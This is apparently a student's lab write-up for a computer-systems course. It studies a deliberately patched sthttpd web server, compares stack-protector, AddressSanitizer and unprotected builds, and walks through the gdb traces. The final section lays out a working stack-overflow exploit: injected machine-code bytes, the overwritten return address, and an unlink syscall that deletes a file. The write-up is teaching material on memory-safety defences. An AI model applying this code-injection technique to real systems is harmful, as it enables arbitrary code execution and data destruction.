1.
$ which gcc
/usr/local/cs/bin/gcc

Check to see if path is set up correctly.


2.
$ wget http://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
$ tar xvzf sthttpd-2.27.0.tar.gz
$ patch -p0 < patch.diff
$ ./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
$ mv src/thttpd src/thttpd-sp
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
$ mv src/thttpd src/thttpd-as
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
$ mv src/thttpd src/thttpd-no

Download sthttpd-2.27.0.tar.gz.
Copy the diff into a patch file.
Untar and patch sthttpd-2.27.0.tar.gz.
Configure and compile the program with 3 different options. Rename the following executables.


3.
$ gdb src/thttpd-sp
(gdb) r -p 12427 -D
$ gdb src/thttpd-as
(gdb) r -p 12428 -D
$ gdb src/thttpd-no
(gdb) r -p 12429 -D
Run the 3 executables via gdb with port numbers generated by the formula provided in the instructions.


4.
$ curl http://localhost:12427/foo.txt
$ curl http://localhost:12428/foo.txt
$ curl http://localhost:12429/foo.txt
I ran curl commands to verify if the web servers were working. I got the following response below, which confirms its working. I also created a sample foo.txt file just to double check, and curling 
again produced the results in the file. 
<HTML>
<HEAD><TITLE>404 Not Found</TITLE></HEAD>
<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
<H2>404 Not Found</H2>
The requested URL '/foo.txt' was not found on this server.`
<HR>
<ADDRESS><A HREF="http://localhost">thttpd</A></ADDRESS>
</BODY>
</HTML>


5.
$ echo 
dir=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111111111111111111111111111111111111111111 > config.txt
$ gdb src/thttpd-sp
(gdb) r -p 12427 -D -C config.txt
Starting program: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/sthttpd-2.27.0/src/thttpd-sp -p 12427 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
*** stack smashing detected ***: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/sthttpd-2.27.0/src/thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
(gdb) bt
#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000404165 in read_config (filename=<optimized out>) at thttpd.c:1129
#7  0x3131313131313131 in ?? ()
#8  0x3131313131313131 in ?? ()
#9  0x3131313131313131 in ?? ()
#10 0x3131313131313131 in ?? ()
#11 0x3131313131313131 in ?? ()
#12 0x3131313131313131 in ?? ()
#13 0x3131313131313131 in ?? ()
#14 0x3131313131313131 in ?? ()
#15 0x3131313131313131 in ?? ()
#16 0x3131313131313131 in ?? ()
#17 0x3131313131313131 in ?? ()
#18 0x3131313131313131 in ?? ()
#19 0x3131313131313131 in ?? ()
#20 0x3131313131313131 in ?? ()
#21 0x3131313131313131 in ?? ()
#22 0x3131313131313131 in ?? ()
#23 0x3131313131313131 in ?? ()
#24 0x3131313131313131 in ?? ()
#25 0x3131313131313131 in ?? ()
#26 0x3131313131313131 in ?? ()
#27 0x3131313131313131 in ?? ()
#28 0x3131313131313131 in ?? ()
#29 0x3131313131313131 in ?? ()
#30 0x3131313131313131 in ?? ()
#31 0x3131313131313131 in ?? ()
#32 0x3131313131313131 in ?? ()
#33 0x3131313131313131 in ?? ()
#34 0x3131313131313131 in ?? ()
#35 0x3131313131313131 in ?? ()
#36 0x3131313131313131 in ?? ()
#37 0x3131313131313131 in ?? ()
#38 0x3131313131313131 in ?? ()
#39 0x3131313131313131 in ?? ()
#40 0x3131313131313131 in ?? ()
#41 0x3131313131313131 in ?? ()
#42 0x3131313131313131 in ?? ()
#43 0x3131313131313131 in ?? ()
...

(gdb) c
(gdb) break read_config
(gdb) set disassemble-next-line on
(gdb) r -p 12427 -D -C config.txt
(gdb) s
...
(gdb) ni
...

1000	    {
=> 0x0000000000403bd0 <read_config+0>:	41 56	push   %r14
   0x0000000000403bd2 <read_config+2>:	be 4d f5 40 00	mov    $0x40f54d,%esi
   0x0000000000403bd7 <read_config+7>:	41 55	push   %r13
   0x0000000000403bd9 <read_config+9>:	41 54	push   %r12
   0x0000000000403bdb <read_config+11>:	55	push   %rbp
   0x0000000000403bdc <read_config+12>:	53	push   %rbx
   0x0000000000403bdd <read_config+13>:	48 89 fb	mov    %rdi,%rbx
   0x0000000000403be0 <read_config+16>:	48 83 ec 70	sub    $0x70,%rsp
   0x0000000000403be4 <read_config+20>:	64 48 8b 04 25 28 00 00 00	mov    %fs:0x28,%rax
   0x0000000000403bed <read_config+29>:	48 89 44 24 68	mov    %rax,0x68(%rsp)
   0x0000000000403bf2 <read_config+34>:	31 c0	xor    %eax,%eax

...

0x000000000040405b	1189	    (void) fclose( fp );
   0x0000000000404045 <read_config+1141>:	4c 89 f7	mov    %r14,%rdi
   0x0000000000404048 <read_config+1144>:	e8 33 e3 ff ff	callq  0x402380 <fclose@plt>
   0x000000000040404d <read_config+1149>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
   0x0000000000404052 <read_config+1154>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
=> 0x000000000040405b <read_config+1163>:	0f 85 ff 00 00 00	jne    0x404160 <read_fconfig+1424>
   0x0000000000404061 <read_config+1169>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000404065 <read_config+1173>:	5b	pop    %rbx
   0x0000000000404066 <read_config+1174>:	5d	pop    %rbp
   0x0000000000404067 <read_config+1175>:	41 5c	pop    %r12
   0x0000000000404069 <read_config+1177>:	41 5d	pop    %r13
   0x000000000040406b <read_config+1179>:	41 5e	pop    %r14
   0x000000000040406d <read_config+1181>:	c3	retq
(gdb)
0x0000000000404160	1129			hostname = e_strdup( value );
   0x000000000040414c <read_config+1404>:	4c 89 ef	mov    %r13,%rdi
   0x000000000040414f <read_config+1407>:	e8 2c fa ff ff	callq  0x403b80 <e_strdup>
   0x0000000000404154 <read_config+1412>:	48 89 05 2d 2e 21 00	mov    %rax,0x212e2d(%rip)        # 0x616f88 <hostname>
   0x000000000040415b <read_config+1419>:	e9 d5 fd ff ff	jmpq   0x403f35 <read_config+869>
=> 0x0000000000404160 <read_config+1424>:	e8 8b e2 ff ff	callq  0x4023f0 <__stack_chk_fail@plt>
   0x0000000000404165 <read_config+1429>:	0f 1f 00	nopl   (%rax)

The first thing I did to make the program crash was to take a look at the source code in the file thttpd.c; especially the part that was changed via the patch file. Since "line[10000]" was changed to 
"line[100]," I assumed that the error was going to be a stack buffer overflow. After examining the source code, I discover the "-C" option which allows configurations to be passed in via a file. I 
created a file called "config.txt" and filled in values that would cause an overflow. As expected, this caused the program to crash. 

After crashing the program, I ran "bt" to get a backtrace of what happened. I googled a few of the functions ran after read_config(). One of them, "__stack_chk_fail", basically terminates a function 
in case of stack overflow. Next, I added a breakpoint to "read_config" and just stepped through the machine instructions. Examining the code, I notice a few things. At the beginning of the fuction, 
the code is storing "%fs:0x28" onto the stack, and towards the end of the fuction, it xors "%fs:0x28" and the value stored in the stack earlier. If it doesn't match, it jumps to another part of the 
fuction that eventually leads to "<__stack_chk_fail@plt>." My conclusion is that this code is checking for buffer overflows by adding and value to the stack and checking to see if that value has 
changed at the end of the fuction. This logic matches the mechanisms described in the '"Strong" stack protection for GCC' reading. Essentially a "canary" is added to the stack and is checked before 
the function returns. If the value has changed, the program will abort.


6.
$ gdb src/thttpd-as
(gdb) r -p 12428 -D -C config.txt
Starting program: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/sthttpd-2.27.0/src/thttpd-as -p 12428 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
=================================================================
==1498==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffccc4 at pc 0x00000048a72c bp 0x7fffffffcc20 sp 0x7fffffffc3d0
READ of size 674 at 0x7fffffffccc4 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
(gdb) bt
#0  0x00007ffff70730b8 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7073fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004de8d3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffaec0, pc=4761388, max_depth=<optimized out>)
    at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:124
#3  0x0000000000416ba7 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342048, pc=4761388, max_depth=256, stack=0x7fffffffaec0)
    at ../../../../gcc-8.2.0/libsanitizer/asan/asan_stack.h:46
#4  __asan::ErrorGeneric::Print (this=this@entry=0x991748 <__asan::ScopedInErrorReport::current_error_+8>) at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.cc:446
#5  0x00000000004d95e4 in __asan::ErrorDescription::Print (this=0x991740 <__asan::ScopedInErrorReport::current_error_>) at ../../../../gcc-8.2.0/libsanitizer/asan/asan_errors.h:338
#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb746, __in_chrg=<optimized out>) at ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:136
#7  __asan::ReportGenericError (pc=4761388, bp=bp@entry=140737488342048, sp=sp@entry=140737488339920, addr=addr@entry=140737488342212, is_write=is_write@entry=false, access_size=access_size@entry=674,
    exp=0, fatal=false) at ../../../../gcc-8.2.0/libsanitizer/asan/asan_report.cc:397
#8  0x000000000048a74b in __interceptor_strchr (s=<optimized out>, c=<optimized out>) at ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618
#9  0x000000000050b6de in read_config (filename=<optimized out>) at thttpd.c:1018
#10 0x3131313131313131 in ?? ()
#11 0x3131313131313131 in ?? ()
#12 0x3131313131313131 in ?? ()
#13 0x3131313131313131 in ?? ()
#14 0x3131313131313131 in ?? ()
#15 0x3131313131313131 in ?? ()
#16 0x3131313131313131 in ?? ()
#17 0x3131313131313131 in ?? ()
#18 0x3131313131313131 in ?? ()
#19 0x3131313131313131 in ?? ()
#20 0x3131313131313131 in ?? ()
#21 0x3131313131313131 in ?? ()
#22 0x3131313131313131 in ?? ()
#23 0x3131313131313131 in ?? ()
#24 0x3131313131313131 in ?? ()
#25 0x3131313131313131 in ?? ()
#26 0x3131313131313131 in ?? ()
#27 0x3131313131313131 in ?? ()
#28 0x3131313131313131 in ?? ()
#29 0x3131313131313131 in ?? ()
#30 0x3131313131313131 in ?? ()
#31 0x3131313131313131 in ?? ()
#32 0x3131313131313131 in ?? ()
#33 0x3131313131313131 in ?? ()
#34 0x3131313131313131 in ?? ()
#35 0x3131313131313131 in ?? ()
#36 0x3131313131313131 in ?? ()
#37 0x3131313131313131 in ?? ()
#38 0x3131313131313131 in ?? ()
#39 0x3131313131313131 in ?? ()
#40 0x3131313131313131 in ?? ()
...

(gdb) c
(gdb) break read_config
(gdb) set disassemble-next-line on
(gdb) r -p 12428 -D -C config.txt
(gdb) s
...
(gdb) ni
...

0x000000000050b6d9	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
   0x000000000050b6d0 <read_config+176>:	48 8b 3c 24	mov    (%rsp),%rdi
   0x000000000050b6d4 <read_config+180>:	be 23 00 00 00	mov    $0x23,%esi
=> 0x000000000050b6d9 <read_config+185>:	e8 e2 f2 f7 ff	callq  0x48a9c0 <__interceptor_strchr(char const*, int)>
   0x000000000050b6de <read_config+190>:	48 85 c0	test   %rax,%rax
   0x000000000050b6e1 <read_config+193>:	74 23	je     0x50b706 <read_config+230>

In order to crash thttpd-as, I also ran the program with the config file. Essentially the source of the bug is the same, but instead '-fstack-protector-strong', this time the bug is detected via 
'-fsanitize=address.' '-fsanitize=address' uses a memory error detector called AddressSanitizer. Stepping through the machine instructions, I discover that we call a method 
"<__interceptor_strchr(char const*, int)>" which causes the program to crash. According to documentation, apparently AddressSanitizer works by using something called Shadow Memory to check if the 
memory has been "poisoned". Basically, every memory access in the program is transformed in the following way:

	Before:

	*address = ...;  // or: ... = *address;
	After:

	if (IsPoisoned(address)) {
	  ReportError(address, kAccessSize, kIsWrite);
	}
	*address = ...;  // or: ... = *address;


7.
$ gdb src/thttpd-no
(gdb) r -p 12429 -D -C config.txt
Starting program: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/sthttpd-2.27.0/src/thttpd-no -p 12429 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
1189	    (void) fclose( fp );
(gdb) bt
#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
#1  0x3131313131313131 in ?? ()
#2  0x3131313131313131 in ?? ()
#3  0x3131313131313131 in ?? ()
#4  0x3131313131313131 in ?? ()
#5  0x3131313131313131 in ?? ()
#6  0x3131313131313131 in ?? ()
#7  0x3131313131313131 in ?? ()
#8  0x3131313131313131 in ?? ()
#9  0x3131313131313131 in ?? ()
#10 0x3131313131313131 in ?? ()
#11 0x3131313131313131 in ?? ()
#12 0x3131313131313131 in ?? ()
#13 0x3131313131313131 in ?? ()
#14 0x3131313131313131 in ?? ()
#15 0x3131313131313131 in ?? ()
#16 0x3131313131313131 in ?? ()
#17 0x3131313131313131 in ?? ()
#18 0x3131313131313131 in ?? ()
#19 0x3131313131313131 in ?? ()
#20 0x3131313131313131 in ?? ()
#21 0x3131313131313131 in ?? ()
#22 0x3131313131313131 in ?? ()
#23 0x3131313131313131 in ?? ()
#24 0x3131313131313131 in ?? ()
#25 0x3131313131313131 in ?? ()
#26 0x3131313131313131 in ?? ()
#27 0x3131313131313131 in ?? ()
#28 0x3131313131313131 in ?? ()
#29 0x3131313131313131 in ?? ()
#30 0x3131313131313131 in ?? ()
#31 0x3131313131313131 in ?? ()
#32 0x3131313131313131 in ?? ()
#33 0x3131313131313131 in ?? ()
#34 0x3131313131313131 in ?? ()
#35 0x3131313131313131 in ?? ()
#36 0x3131313131313131 in ?? ()
#37 0x3131313131313131 in ?? ()
#38 0x3131313131313131 in ?? ()
#39 0x3131313131313131 in ?? ()
#40 0x3131313131313131 in ?? ()
#41 0x3131313131313131 in ?? ()
#42 0x3131313131313131 in ?? ()
#43 0x3131313131313131 in ?? ()
...

(gdb) c
(gdb) break read_config
(gdb) set disassemble-next-line on
(gdb) r -p 12429 -D -C config.txt
(gdb) s
...
(gdb) ni
...

Program received signal SIGSEGV, Segmentation fault.
0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
1189	    (void) fclose( fp );
   0x0000000000403f65 <read_config+1125>:	4c 89 f7	mov    %r14,%rdi
   0x0000000000403f68 <read_config+1128>:	e8 b3 e3 ff ff	callq  0x402320 <fclose@plt>
   0x0000000000403f6d <read_config+1133>:	48 83 c4 70	add    $0x70,%rsp
   0x0000000000403f71 <read_config+1137>:	5b	pop    %rbx
   0x0000000000403f72 <read_config+1138>:	5d	pop    %rbp
   0x0000000000403f73 <read_config+1139>:	41 5c	pop    %r12
   0x0000000000403f75 <read_config+1141>:	41 5d	pop    %r13
   0x0000000000403f77 <read_config+1143>:	41 5e	pop    %r14
=> 0x0000000000403f79 <read_config+1145>:	c3	retq

(gdb) p $rsp
$3 = (void *) 0x7fffffffce88
(gdb) x $rsp
0x7fffffffce88:	0x31313131

For this program, compiler settings "-fno-stack-protector -zexecstack" turn off stack protection as well as permits the execution of code on the stack. Theortically, this means that we may not be 
able to detect a buffer overflow. However, after running the program, we still get a Segmentation fault. Examining the machine instructions, we first notice that there aren't any extra protection 
code added like the previous two programs. This aligns we the compiler settings. Next, we notice that the error occurs when the fuction returns. Examining the code a little further, we notice that 
the return address points to a vastly different place. This likely means that the address is simply pointed to a place we're we're not allowed to access and therefore throws a Segmentation fault. 


8.
$ make clean
$ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
$ mv src/thttpd.o src/thttpd-sp.s
$ make clean
$ make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
$ mv src/thttpd.o src/thttpd-as.s
$ make clean
$ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
$ mv src/thttpd.o src/thttpd-no.s
$ diff -u thttpd-sp.s thttpd-as.s
$ diff -u thttpd-sp.s thttpd-no.s
$ diff -u thttpd-as.s thttpd-no.s


thttpd-sp.s vs thttpd-no.s
For the function handle_read, I initially assumed to see a canery being inserted much like it was for read_config. However, after examining the assembly code, there is basically no difference between 
thttpd-sp.s and thttpd-no.s. It seems that perhaps a canary is not used in this case since it doesn't allocate a finite sized buffer like read_config does.

thttpd-as.s vs thttpd-no.s
The "thttpd-as.s" variant of the code contains signficantly more lines of code than the "thttpd-no.s" one. This is due the implementation of Shadow memory. The "thttpd-as.s" variat has a lot of code 
like "cmpb	$0, 2147450880(%rax)" sprinkled around which basically checks to see that memory is "unpoisoned."

thttpd-sp.s vs thttpd-as.s
Basically, "thttpd-as.s" implements shadow memory to check to see if memory is "poisoned". "thttpd-sp.s" does not seem to check for stack buffer overflow with a canary in "handle_read."


9.
Create test.c that includes code to delete "victim.txt."
$ gcc -g3 test.c
(gdb) break main
Breakpoint 1 at 0x4004e6: file test.c, line 5.
(gdb) break unlink
Breakpoint 2 at 0x4003e0
(gdb) set disassemble-next-line on
(gdb) r
Starting program: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/a.out

Breakpoint 1, main () at test.c:5
5	    unlink("victim.txt");
=> 0x00000000004004e6 <main+4>:	bf 84 05 40 00	mov    $0x400584,%edi
   0x00000000004004eb <main+9>:	e8 f0 fe ff ff	callq  0x4003e0 <unlink@plt>
(gdb) x/x 0x400584
0x400584:	0x74636976
(gdb) x/s 0x400584
0x400584:	"victim.txt"
(gdb) s
...
Breakpoint 2, 0x00007ffff7aff3a0 in unlink () from /lib64/libc.so.6
=> 0x00007ffff7aff3a0 <unlink+0>:	b8 57 00 00 00	mov    $0x57,%eax
(gdb) ni
0x00007ffff7aff3a5 in unlink () from /lib64/libc.so.6
=> 0x00007ffff7aff3a5 <unlink+5>:	0f 05	syscall

(gdb) break read_config
(gdb) set disassemble-next-line on
(gdb) r -p 12428 -D -C config.txt
(gdb) x $rsp
0x7fffffffce88:	79 'O'
(gdb) x line
0x7fffffffcdf0:	0 '\000'
0x7fffffffce88 - 0x7fffffffcdf0 = 152

$ echo -n "victim.txt"  | xxd
0000000: 7669 6374 696d 2e74 7874                 victim.txt
$ echo -n "dir="  | xxd
0000000: 6469 723d                                dir=

Create move.s that includes:
"movq    $0x7fffffffce70,%rdi"
gcc -c move.s
$ objdump -d move.o

move.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 bf 70 ce ff ff ff 	movabs $0x7fffffffce70,%rdi
   7:	7f 00 00


$ ls
aclocal.m4  config.h.in  config.status  configure     depcomp  extras   install-sh  Makefile.am  missing  scripts  stamp-h1  victim.txt
config.h    config.log   config.txt     configure.ac  docs     foo.txt  Makefile    Makefile.in  README   src      TODO      www
$ gdb src/thttpd-no
(gdb) r -p 12429 -D -C config.txt
Starting program: /w/home.23/cs/grad/thomasp/Documents/cs33/lab/lab3/sthttpd-2.27.0/src/thttpd-no -p 12429 -D -C config.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffce05 in ?? ()
$ ls
aclocal.m4  config.h.in  config.status  configure     depcomp  extras   install-sh  Makefile.am  missing  scripts  stamp-h1  www
config.h    config.log   config.txt     configure.ac  docs     foo.txt  Makefile    Makefile.in  README   src      TODO



/* Information that helped me visualize the data */
(line/top)
6469 723d 48bf 70ce ffff ff7f 0000 b857
0000 000f 0500 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
7669 6374 696d 2e74 7874 0000 0000 0000
0000 0000 0000 0000 f4cd ffff ff7f 0000
					<return address>
(bottom)

0x7fffffffcdf4	start of exploit address
0x7fffffffcdf0 	line/top of stack
0x7fffffffce88 	bottom of stack
0x7fffffffce90	return address
0x7fffffffce70 	victim.txt address
/* End */


From the previous exrcises, it seems like the way to exploit the program is to use stack buffer overflow. To do that, I'll need to figure out how to inject malicious code and get the program to 
execute it. My hypothesis is that I need to inject enough code so that I can overwrite the return address and have it point to my malicious code. 

The first thing I do is to figure out how to delete a file in c. The TA lecture slides gave us some clues. One, we could use "unlink" to delete a file, and two, that we should try googling "x86 
assebmly syscall." After googling, I create a small c program that basically includes 'unlink("victim.txt").' I then use gdb to examine the byte level instructions.

Next, I gather some information about my stack. Using gdb, I gather the addresses of the bottom and top of my stack. I also get its difference to figure out how many bytes of data I'll need to inject.

Next, I start gathering the byte code that I'll need to inject. I know that the first part of my code will be "dir=", so I start by getting the byte code representation for that string with "xxd." I 
also do the same thing to get the byte code representation of "victim.txt."

I'm now able to start piecing together my code. I start off by adding the byte code for "dir=" which takes up 4 bytes. The next thing I do is start adding the actual code to delete the file. However, 
before I can do this, I need to store "victim.txt" somewhere in my code so that I can specify which file to delete in my exploit code. I store "victim.txt" 24 bytes above the bottom of the stack, and 
calculate the exact address. I modify my deletion code, by creating an assembly file, compiling it, and getting the objdump. With this information, I'm able to complete the rest of my deletion code. 

Next, I override the original return address with the address of my exploit code. Since my exploit code starts after "dir=," I use the address 4 bytes larger than the top address, and I write it 
according to little endian convention. 

Next, I convert my hex byte code into a raw format. I use the following website: http://tomeko.net/online_tools/hex_to_file.php?lang=en since I wasn't able to figure out how to get hex2raw to work.

Lastly, I run my code via "gdb," and I observe that "victim.txt" was indeed deleted.

Note: This is an abbreviated version. There was a lot of trial and error. Most errors involved incorrect byte code generation and incorrect addresses.